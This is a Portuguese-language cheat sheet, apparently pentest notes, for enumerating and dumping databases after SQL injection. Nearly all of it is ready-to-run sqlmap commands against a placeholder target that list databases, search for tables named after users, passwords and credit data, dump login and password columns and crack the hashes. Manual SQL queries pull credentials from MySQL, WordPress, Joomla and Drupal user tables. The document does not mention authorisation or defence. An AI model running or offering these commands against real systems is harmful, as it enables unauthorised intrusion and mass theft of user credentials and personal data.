# Enumeração do Banco de Dados

## Sequência de Enumeração

```
1. Banner (versão do BD)
2. Usuário atual + privilégios
3. Banco atual
4. Listar todos os bancos
5. Listar tabelas do banco alvo
6. Listar colunas das tabelas
7. Extrair dados
```

## Comandos SQLMap

```bash
BASE="sqlmap -u 'http://alvo.com/?id=1' --batch --random-agent"

# 1. Banner
$BASE --banner

# 2. Usuário e DBA
$BASE --current-user --is-dba

# 3. Banco atual
$BASE --current-db

# 4. Todos os bancos
$BASE --dbs

# 5. Tabelas de um banco
$BASE -D nome_banco --tables

# 6. Colunas de uma tabela
$BASE -D nome_banco -T nome_tabela --columns

# 7. Dump de tabela
$BASE -D nome_banco -T nome_tabela --dump

# 8. Dump de coluna específica
$BASE -D nome_banco -T usuarios -C "login,senha" --dump
```

## Tabelas de Alto Valor

```sql
-- MySQL: credenciais
SELECT user, password FROM mysql.user;

-- WordPress
SELECT user_login, user_pass FROM wp_users;

-- Joomla
SELECT username, password FROM jos_users;

-- Drupal
SELECT name, pass FROM users;

-- Genérico
SELECT * FROM users;
SELECT * FROM admin;
SELECT * FROM accounts;
SELECT * FROM credentials;
```

## Enumeração Manual

```sql
-- Versão
SELECT version();                    -- MySQL/PostgreSQL
SELECT @@version;                    -- MSSQL
SELECT * FROM v$version;             -- Oracle

-- Bancos
SHOW DATABASES;                      -- MySQL
SELECT name FROM master.dbo.sysdatabases;  -- MSSQL
SELECT datname FROM pg_database;     -- PostgreSQL
SELECT name FROM v$database;         -- Oracle

-- Tabelas
SHOW TABLES;                         -- MySQL
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT name FROM sysobjects WHERE xtype='U';  -- MSSQL

-- Colunas
DESCRIBE tabela;                     -- MySQL
SELECT column_name FROM information_schema.columns WHERE table_name='tabela';
```

## Dump Seletivo (Eficiente)

```bash
# Só tabelas com palavra-chave
sqlmap -u "http://alvo.com/?id=1" \
  -D webapp \
  --tables \
  --search -T "user" \
  --batch

# Dump com filtro de linha
sqlmap -u "http://alvo.com/?id=1" \
  -D webapp -T users \
  --dump \
  --where="admin=1" \
  --batch

# Dump de X linhas
sqlmap -u "http://alvo.com/?id=1" \
  -D webapp -T users \
  --dump \
  --start=1 --stop=100 \
  --batch
```

## Detectar Tabelas Sensíveis

```bash
# Busca automática por tabelas sensíveis
sqlmap -u "http://alvo.com/?id=1" \
  --search -T "admin,user,pass,login,account,credit" \
  --batch
```

## Extrair Hashes de Senha

```bash
# Dump de senhas com tentativa de crack
sqlmap -u "http://alvo.com/?id=1" \
  -D webapp -T users -C "username,password" \
  --dump \
  --crack \
  --batch
```
